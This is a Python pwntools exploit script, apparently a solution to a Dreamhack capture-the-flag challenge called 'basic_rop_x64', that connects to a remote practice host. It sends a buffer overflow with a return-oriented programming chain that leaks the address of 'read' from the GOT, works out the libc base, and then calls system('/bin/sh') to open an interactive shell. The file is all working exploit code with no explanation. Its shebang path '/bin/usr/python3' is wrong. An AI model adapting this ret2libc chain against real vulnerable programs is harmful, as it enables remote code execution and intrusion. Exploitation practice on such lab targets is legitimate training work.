#! /bin/usr/python3

from pwn import *

def slog(name, addr):
    return success(" : ".join([name, hex(addr)]))

binary = "./basic_rop_x64"
p = remote("host3.dreamhack.games", 21292)
e = ELF(binary)
libc = ELF("./libc.so.6", checksec = False)
r = ROP(e)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
main = e.sym['main']

sh = list(libc.search(b'/bin/sh'))[0]
pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0] 

payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt) + p64(main)

p.send(payload)

p.recvuntil(b'A' * 0x40)

read = u64(p.recvn(6) + b'\x00' * 2)
lb = read - libc.sym['read']
system = lb + libc.sym['system']
binsh = lb + sh

payload = b'A' * 0x48
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
